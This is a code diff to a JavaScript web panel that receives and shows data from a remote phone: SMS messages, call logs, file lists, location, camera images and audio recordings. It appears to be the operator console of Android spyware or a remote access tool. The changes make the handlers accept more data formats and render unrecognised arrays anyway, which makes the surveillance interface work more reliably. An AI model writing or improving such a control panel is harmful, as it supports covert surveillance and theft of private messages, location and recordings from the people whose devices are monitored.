@@ -929,34 +929,50 @@
         panel.innerHTML = `📤 Plain text sent: ${msg}`;
     }
 
+    // ---------- HELPER: Extract array data from JSON ----------
+    function extractDataArray(json) {
+        if (Array.isArray(json)) return json;
+        if (json.data && Array.isArray(json.data)) return json.data;
+        if (json.smsList && Array.isArray(json.smsList)) return json.smsList;
+        if (json.messages && Array.isArray(json.messages)) return json.messages;
+        if (json.files && Array.isArray(json.files)) return json.files;
+        if (json.logs && Array.isArray(json.logs)) return json.logs;
+        if (json.items && Array.isArray(json.items)) return json.items;
+        if (json.list && Array.isArray(json.list)) return json.list;
+        return null;
+    }
+
     // ---------- PLAIN TEXT / JSON HANDLERS ----------
     function handleJSON(json) {
         console.log('handleJSON:', json.type, json);
         switch (json.type) {
             case 'SMS_DATA':
-                console.log('📩 SMS_DATA received', json.data);
+                console.log('📩 SMS_DATA received', json);
                 dataType = 'sms';
-                currentData = json.data;
+                currentData = extractDataArray(json) || json.data || json;
+                if (!Array.isArray(currentData)) currentData = [];
                 renderTable();
                 break;
             case 'CALL_LOGS':
                 dataType = 'call';
-                currentData = json.data;
+                currentData = extractDataArray(json) || json.data || json;
+                if (!Array.isArray(currentData)) currentData = [];
                 renderTable();
                 break;
             case 'FILE_LIST':
                 dataType = 'file';
-                currentData = json.data;
+                currentData = extractDataArray(json) || json.data || json;
+                if (!Array.isArray(currentData)) currentData = [];
                 renderFiles();
                 break;
             case 'LOCATION_UPDATE':
-                renderMap(json.data);
+                renderMap(json.data || json);
                 break;
             case 'CAMERA_IMAGE':
-                displayCapturedImage(json.data);
+                displayCapturedImage(json.data || json);
                 break;
             case 'AUDIO_RECORDING':
-                showAudio(json.data);
+                showAudio(json.data || json);
                 break;
             case 'FILE_DATA':   // <-- NEW: handle JSON file data
                 // Expected format: { base64: "...", filename: "..." }
@@ -999,6 +1015,20 @@
                 break;
             default:
                 console.log('Unhandled JSON type:', json.type);
+                // Attempt to render anyway if it looks like data
+                if (Array.isArray(json)) {
+                    // Could be a direct array of SMS/call/files
+                    if (json.length > 0) {
+                        const first = json[0];
+                        if (first.body !== undefined) dataType = 'sms';
+                        else if (first.duration !== undefined) dataType = 'call';
+                        else if (first.isDir !== undefined) dataType = 'file';
+                        else dataType = 'unknown';
+                        currentData = json;
+                        if (dataType === 'file') renderFiles();
+                        else renderTable();
+                    }
+                }
         }
     }
 
@@ -1059,7 +1089,6 @@
             // Try to guess filename from path if available
             let fname = 'downloaded_file';
             if (selectedFiles.length > 0) {
-                // We don't know which file this corresponds to, so just use the first selected path's basename
                 const firstPath = selectedFiles[0];
                 if (firstPath) {
                     const parts = firstPath.split('/');
@@ -1290,7 +1319,8 @@
         if (!currentData || currentData.length === 0) {
             html += '<p style="padding:20px;">No files found.</p>';
         } else {
-            const folders = currentData.filter(item => item.isDir);
+            // Ensure currentData is an array of objects with isDir, name, path, size
+            const folders = currentData.filter(item => item.isDir === true);
             const files = currentData.filter(item => !item.isDir);
             // Reset selected files when new list loads
             selectedFiles = [];
